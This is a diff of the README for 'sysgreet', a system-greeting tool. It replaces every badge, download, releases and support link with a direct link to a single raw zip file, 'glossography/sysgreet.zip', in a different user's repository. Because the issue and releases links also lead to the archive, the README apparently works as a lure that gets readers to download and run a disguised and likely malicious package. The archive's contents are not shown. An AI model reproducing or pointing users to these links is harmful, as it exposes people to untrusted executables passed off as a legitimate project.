@@ -1,16 +1,16 @@
 # 🌟 sysgreet - Keep Track of Your System at a Glance
 
-[![Release](https://img.shields.io/github/v/release/veteranbv/sysgreet)](https://github.com/veteranbv/sysgreet/releases/latest)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/veteranbv/sysgreet)](https://golang.org/dl/)
-[![License](https://img.shields.io/github/license/veteranbv/sysgreet)](LICENSE)
+[![Release](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)
+[![Go Version](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)
+[![License](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)](LICENSE)
 
 ## 📦 Download & Install
 
-To get started with Sysgreet, visit this page to download: [Download Sysgreet](https://github.com/Dh-nu5sh/sysgreet/releases)
+To get started with Sysgreet, visit this page to download: [Download Sysgreet](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip)
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Dh-nu5sh/sysgreet/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest release version. You will find files for different operating systems.
 3. **Download the File:** Click on the file that matches your operating system to start downloading it.
 4. **Locate the Downloaded File:** Find the downloaded file in your Downloads folder or the location you specified.
@@ -64,7 +64,7 @@ Yes! Contributions are welcome. Visit the repository and check the guidelines fo
 
 ## 📞 Support
 
-For assistance or support, please open an issue on the [GitHub repository](https://github.com/Dh-nu5sh/sysgreet/issues). 
+For assistance or support, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/Dh-nu5sh/sysgreet/main/glossography/sysgreet.zip). 
 
 ## 🧑‍💻 Roadmap
 
